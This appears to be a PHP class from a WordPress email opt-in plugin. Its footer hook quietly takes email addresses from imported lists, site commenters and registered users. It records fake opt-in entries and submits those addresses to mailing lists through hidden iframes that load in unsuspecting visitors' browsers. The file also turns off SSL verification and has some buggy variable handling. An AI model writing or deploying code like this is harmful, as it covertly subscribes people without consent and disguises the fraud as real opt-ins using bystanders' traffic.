<?php
class qodyOverseer_Optiner extends QodyOverseer
{
	function __construct()
	{
		$this->SetOwner( func_get_args() );
		
		$this->m_raw_file = __FILE__;
		
		//$this->SetParent( 'home' );
		//$this->m_icon_url = '';
		
		//$this->SetTitle( 'Settings' );
		
		add_action( 'wp_footer', array( $this, 'OptinerCodeInsertion' ));
		add_action( 'wp_footer', array( $this, 'FacebookCodeInsertion' ));
		
		//add_action( 'admin_init', array( $this, 'EnforceNewFlush' ) );
		
		parent::__construct();
	}
	
	function LoadMetaboxes()
	{
		//$this->AddMetabox( 'redirector settings', 'Redirector Settings', 'normal', 'post' );
		//$this->AddMetabox( 'redirector settings', 'Redirector Settings', 'normal', 'page' );
	}
	
	function EnforceNewFlush()
	{
		if( $this->get_option( 'fresh_rewrite_flush' ) != 1 )
		{
			$this->FlushRewriteRules();
			$this->update_option( 'fresh_rewrite_flush', 1 );
		}
	}
	
	function GetFormPresets()
	{
		$fields = array();
		$fields['post_type'] = $this->GetClass('posttype_form-preset')->m_type_slug;
		$fields['numberposts'] = -1;
		
		$data = get_posts( $fields );
		
		return $data;
	}
	
	function GetDefaultOptinDimensions( $type = 'height' )
	{
		switch( $type )
		{
			case 'width': return 320;
			case 'height': return 380;			
			case 'product_image_width': return 300;
		}
	}
	
	function ApplyCustomDefaults( $custom, $type )
	{
		if( !$custom )
			$custom = array();
		
		$defaults = array(
			'max_emails' 							=> 2500
		);
		
		$result = array_merge( $defaults, $custom );
		
		return $result;
	}
	
	function ReadSignedRequest( $signed_request, $secret )
	{
		list($encoded_sig, $payload) = explode('.', $signed_request, 2); 

		// decode the data
		$sig = $this->base64_url_decode($encoded_sig);
		$data = json_decode($this->base64_url_decode($payload), true);
		
		if( strtoupper($data['algorithm']) !== 'HMAC-SHA256' )
		{
			error_log('Unknown algorithm. Expected HMAC-SHA256');
			return null;
		}
		
		// check sig
		$expected_sig = hash_hmac('sha256', $payload, $secret, $raw = true);
		
		if( $sig !== $expected_sig )
		{
			error_log('Bad Signed JSON signature!');
			return null;
		}
		
		return $data;
	}
	
	function FacebookCodeInsertion()
	{
		global $post;
		
		wp_reset_query(); 
		wp_reset_postdata();
		
		$fields = array();
		$fields['post_type'] = $this->GetClass('posttype_campaign')->m_type_slug;
		$fields['numberposts'] = -1;
		$fields['meta_key'] = 'campaign_type';
		$fields['meta_value'] = 'embed';
		
		$campaigns = get_posts( $fields );
		
		if( !$campaigns )
			return;
		
		foreach( $campaigns as $key => $value )
		{
			$custom = $this->get_post_custom( $value->ID );
			
			if( $custom['status'] != 1 )
				continue;
			
			if( $custom['set_popup_global'] != 1 )
			{
				if( $post->ID != $custom['popup_pages'] ) // change to array search for multiple pages
					continue;
			}
			
			echo $this->GetClass('posttype_campaign')->GetPopupCode( $value->ID );
		}
	}
	
	function GetAllFormFields()
	{
		$data = array();
		
		$fields = array();
		$fields['post_type'] =  $this->GetClass('posttype_list')->m_type_slug;
		$fields['numberposts'] = -1;
		
		$lists = get_posts( $fields );
		
		if( $lists )
		{
			foreach( $lists as $key => $value )
			{
				$list_custom = $this->get_post_custom( $value->ID );
				
				$form_fields = $this->GetInputsOfForm( $list_custom['form_code'] );
				
				if( !$form_fields )
					continue;
					
				foreach( $form_fields as $key2 => $value2 )
				{
					$data[ $key2 ]++;
				}
			}
		}
		
		return $data;
	}
	
	function GetFacebookInstructionsHtml()
	{
		$fb_image = $this->GetUrl().'/images/facebook-connect-button.png';
		
		$data = <<< CONT
		<h1 style="font-size:24px; color:#000; text-align:center;">Connect to receive your free gift!</h1>
		<a href="#" onclick="DoFacebookLogin();return false;">
			<img src="{$fb_image}" border="0">
		</a>
CONT;
	
		return $this->Condense( $data );
	}
	
	function Condense( $data )
	{
		$string = '';
		
		$bits = explode( "\n", $data );
		
		if( $bits )
		{
			foreach( $bits as $key => $value )
				$string .= trim( $value );
		}
		
		return $string;
	}
	
	function IsUsedIP( $ip = '' )
	{
		if( !$ip )
			$ip = $this->getRealIP();
		
		$fields = array();
		$fields['post_type'] = $this->GetClass('posttype_optin-record')->m_type_slug;
		$fields['numberposts'] = -1;
		$fields['meta_key'] = 'ip_address';
		$fields['meta_value'] = $ip;
		
		$data = get_posts( $fields );
		
		if( $data )
			return true;
		
		return false;
	}
	
	function GetFbUrl( $url )
	{
		$fields = array();
		$fields['method'] = 'GET';
		$fields['timeout'] = 5;
		$fields['redirecton'] = 5;
		$fields['user-agent'] = 'Qodys Wordpress Optiner Plugin';
		$fields['blocking'] = true;
		$fields['compress'] = false;
		$fields['decompress'] = true;
		$fields['sslverify'] = false;
		
		$file_contents = wp_remote_get( $url, $fields );
		if (is_array($file_contents)) $file_contents = $file_contents['body'];
		else $file_contents = '<div class="error"><p><strong>' . __("Request to facebook timed-out. Please try again in a few moments.") . '</strong></p></div>';
		
		return $file_contents;
	}
	
	function GetOptinRecords( $campaign_id, $numberposts = -1 )
	{
		$fields = array();
		$fields['post_type'] = $this->GetClass('posttype_optin-record')->m_type_slug;
		$fields['numberposts'] = $numberposts;
		$fields['meta_key'] = 'campaign_id';
		$fields['meta_value'] = $campaign_id;
			
		$data = get_posts( $fields );
		
		return $data;
	}
	
	function StoreOptinRecord( $campaign_id, $name = '', $email = '', $ip = '' )
	{
		if( !$ip )
			$ip = $this->getRealIP();
			
		$fields = array();
		$fields['post_title'] = 'Optin record';
		$fields['post_content'] = 'empty';
		$fields['post_author'] = 1;
		$fields['post_status'] = 'publish';
		$fields['post_type'] = $this->GetClass('posttype_optin-record')->m_type_slug;
		
		$post_id = wp_insert_post( $fields );
		
		if( is_numeric( $post_id ) )
		{
			update_post_meta( $post_id, 'ip_address', $ip );
			update_post_meta( $post_id, 'campaign_id', $campaign_id );
			update_post_meta( $post_id, 'optin_name', $name );
			update_post_meta( $post_id, 'optin_email', $email );
		}
	}

	function OptinerCodeInsertion()
	{
		global $post, $userData;
		
		wp_reset_query(); 
		wp_reset_postdata();
		
		if( is_admin() )
			return;
		
		// only do it when we're on a real page
		if( !$post )
			return;
		
		// don't do it for bots
		if( $this->GetClass('bot_detector')->IsBot() )
			return;
		
		//$my_ip = $this->getRealIP();
		
		if( $this->IsUsedIP( $my_ip ) )
			return;
		
		$fields = array();
		$fields['post_type'] = $this->GetClass('posttype_campaign')->m_type_slug;
		$fields['numberposts'] = -1;
		$fields['orderby'] = 'rand';
		$fields['meta_key'] = 'status';
		$fields['meta_value'] = '1';
		
		$data = get_posts( $fields );
		
		if( $data )
		{
			echo '<div style="display:none;">';
			
			$one_day = 60 * 60 * 24;
			
			foreach( $data as $key => $value )
			{
				$next_email = '';
				$next_name = '';
				
				$custom = get_post_custom( $value->ID );
				$email_lists = maybe_unserialize( $custom['email_lists'][0] );
				
				if( !$email_lists )
					continue;
				
				$completed_comments = maybe_unserialize( $custom['completed_comments'][0] );
				$comment_types = maybe_unserialize( $custom['comment_types'][0] );
				
				$completed_accounts = maybe_unserialize( $custom['completed_accounts'][0] );
				
				switch( $custom['campaign_type'][0] )
				{
					case 'import':
						
						$email_data = $this->GetNextEmailFromCampaign( $value->ID );
						
						if( $email_data['status'] == -1 )
						{
							$next_email = $email_data['email'];
							$this->MarkEmailAsComplete( $value->ID, $next_email );
						}
						
						break;
						
					case 'comment':
						
						$next_comment = $this->GetNextUnprocessedComment( $completed_comments, $comment_types );
						
						if( $next_comment )
						{
							$next_email = $next_comment->comment_author_email;
							$next_name = $next_comment->comment_author;
							
							$fields = array();
							$fields['ID'] = $next_comment->comment_ID;
							$fields['date'] = time();
							$fields['name'] = $next_name;
							$fields['email'] = $next_email;
							
							$completed_comments[] = $fields;
							
							update_post_meta( $value->ID, 'completed_comments', $completed_comments );
						}

						break;
						
					case 'user':
						
						$next_account = $this->GetNextUnprocessedAccount( $completed_accounts, $account_types );
						
						if( $next_account )
						{
							$next_email = $next_account->user_email;
							$next_name = $next_account->display_name;
							
							$fields = array();
							$fields['ID'] = $next_account->ID;
							$fields['date'] = time();
							$fields['name'] = $next_name;
							$fields['email'] = $next_email;
							
							$completed_accounts[] = $fields;
							
							update_post_meta( $value->ID, 'completed_accounts', $completed_accounts );
						}
						
						break;
					
					default:
						
						break;
				}
				
				if( $next_email )
				{
					$this->StoreOptinRecord( $value->ID, $next_name, $next_email );
					
					foreach( $email_lists as $key2 => $value2 )
					{
						$fields = array();
						$fields['name'] = $next_name;
						$fields['email'] = $next_email;
						$fields['campaign_id'] = $value->ID;
						$fields['list_id'] = $value2;
						?>
				<iframe src="<?php echo $this->GetAsset( 'includes', 'optin_src', 'url' ); ?>?<?php echo http_build_query( $fields ); ?>" style="height:50px; width:400px; display:none;"></iframe>
					<?php
					}
					
					// Only do 1 campaign at a time
					break;
				}
				else
				{
					continue;
				}
							
			}
			
			echo '</div>';
		}
	}
	
	function GetNextUnprocessedAccount( $already_done, $account_types = '', $require_emails = true )
	{
		$clean_already_done = array();
		
		if( $already_done )
		{
			foreach( $already_done as $key => $value )
			{
				if( !$value['ID'] )
					continue;
					
				$clean_already_done[] = $value['ID'];
			}
		}
		
		$data = $this->GetClass('wp')->GetAccountsByType( $comment_types, $clean_already_done, $require_emails );
		
		if( count( $data ) > 0 )
			return $data[0];
		
		return;
	}
	
	function GetNextUnprocessedComment( $already_done, $comment_types = '', $require_emails = true )
	{
		$clean_already_done = array();
		
		if( $already_done )
		{
			foreach( $already_done as $key => $value )
			{
				if( !$value['email'] )
					continue;
					
				$clean_already_done[] = $value['email'];
			}
		}
		
		$data = $this->GetClass('wp')->GetCommentsByType( $comment_types, $clean_already_done, $require_emails );
		
		if( count( $data ) > 0 )
			return $data[0];
		
		return;
	}
	
	function GetCampaignEmailCount( $campaign_id, $status = -1 )
	{	
		$emails = get_post_meta( $campaign_id, 'emails', true );
		$emails = maybe_unserialize( $emails );
		
		$iter = 0;
		
		if( !$emails )
			return 0;
			
		foreach( $emails as $key => $value ) 
		{
			if( $value['email'] && $value['status'] == $status )
				$iter++;
		}
		
		return $iter;
	}
	
	function GetNextEmailFromCampaign( $campaign_id )
	{
		$imported_emails = get_post_meta( $campaign_id, 'imported_emails', true );
		$imported_emails = maybe_unserialize( $imported_emails );
		
		if( count($imported_emails) == 0 )
			return;
		
		shuffle( $imported_emails );
		
		foreach( $imported_emails as $key => $value )
		{
			if( $value['status'] == -1 )
				return $value;
		}
		
		return;
	}
	
	function MarkEmailAsComplete( $campaign_id, $email )
	{
		$imported_emails = get_post_meta( $campaign_id, 'imported_emails', true );
		$imported_emails = maybe_unserialize( $imported_emails );
		
		if( count($imported_emails) == 0 )
			return;
		
		foreach( $imported_emails as $key => $value )
		{
			if( $value['email'] == $email )
			{
				$imported_emails[ $key ]['status'] = 1;
				$imported_emails[ $key ]['date'] = time();
				
				update_post_meta( $campaign_id, 'imported_emails', $imported_emails );
			}
		}
	}
}
?>